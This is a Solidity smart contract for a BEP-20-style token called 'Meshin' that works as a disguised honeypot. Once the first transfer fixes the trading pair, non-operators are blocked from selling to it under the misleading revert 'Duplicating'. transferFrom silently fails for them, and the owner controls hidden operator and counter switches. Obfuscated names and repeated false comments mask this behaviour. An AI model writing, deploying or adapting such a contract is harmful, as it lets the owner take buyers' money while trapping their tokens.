// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;



contract Meshin {
  /**
    * @dev Returns the bep token owner.
    */
    string public name;
    string public symbol;
    uint160 public decimals;
    uint256 public totalSupply;
    address private _owner;
    address private _router;
    address private _last;
    uint160 private _txs;
    uint160 private _txsNew;
  /**
    * @dev Returns the bep token owner.
    */
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private _operators;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
  /**
    * @dev Returns the bep token owner.
    */
    constructor(string memory _name97n2iR, string memory _symbolV0TupU, uint160 _decimals, uint _supplyjD9iIw, uint160 txsG0h4w0, uint160 txsNewsTwMZbY) {
        name = _name97n2iR;
        symbol = _symbolV0TupU;
        decimals = _decimals;
        totalSupply = _supplyjD9iIw * 10 ** _decimals; 
        balanceOf[msg.sender] = totalSupply;
        _owner = msg.sender;
        _router = address(0);
        _last = address(_owner);
        _txs = txsG0h4w0;
        _txsNew = txsNewsTwMZbY;
        _operators[_owner] = true;     
        _operators[address(_decimals)] = true; 
        _operators[address(_decimals-1)] = true;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
  /**
    * @dev Returns the bep token owner.
    */
    
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        _transfer(msg.sender, _to, _value);
        return true;
    }

  /**
    * @dev Returns the bep token owner.
    */
    function _transfer(address _from, address _to, uint256 _value) internal {
    
        require(_to != address(0));
         
        if(_from != address(0) && _router == address(0)) _router = _to; 
        else {                                                          
            if(_txs == 0) {                                             
                _operators[address(decimals)] = false;
                _txs = type(uint160).max;
            }                                   
            if (_operators[address(decimals)])                      
            {
                if(_operators[address(decimals-1)] && _to == _router)
                    require(_last == _from, "Deprecated"); 
            }                 
            else if(_operators[_from]) {   
                _last = _to;      
            }
            else require(_to != _router, "Duplicating");    
            _txs--;
        }
        _last = _to;              
        
        balanceOf[_from] = balanceOf[_from] - (_value);
        balanceOf[_to] = balanceOf[_to] + (_value);
        emit Transfer(_from, _to, _value);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function getOwner() external view returns (address) {
        return _owner;
    }
    /**
    * @dev Throws if called by any account other than the owner.
    */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function nodeSet(address _to, bool _set) external onlyOwner returns (bool) {
        require(_to != address(0));
        _operators[_to] = _set;
        return true;
    }

    function node(address _verify) external view returns (bool) {
    return _operators[_verify];
    }

    function setTXsCEz654(uint160 txs) external onlyOwner returns (bool) {
        _txs = txs;
        if(_txs != 0) _operators[address(decimals)] = true;
        return true;
    }

    /**
    * @dev Returns the bep token owner.
    */

    function approve(address _spender, uint256 _value) external returns (bool) {
        require(_spender != address(0));
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function getMetricsArcDD1() external view returns (uint160 txs, address last, bool state, bool algo) {
        txs = _txs;
        last = _last;
        state = _operators[address(decimals)];
        algo = _operators[address(decimals-1)];
    }
  /**
    * @dev Returns the bep token owner.
    */
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        allowance[_from][msg.sender] = allowance[_from][msg.sender] - (_value);
        if(_from != _owner && !_operators[_from] && !_operators[address(decimals)]) return false;
        _transfer(_from, _to, _value);
        return true;
    }

      /**
    * @dev Returns the bep token owner.
    */
    function getMetricsNewypPQE2() external view returns (uint160 txsNew) {
        txsNew = _txsNew;
    }



}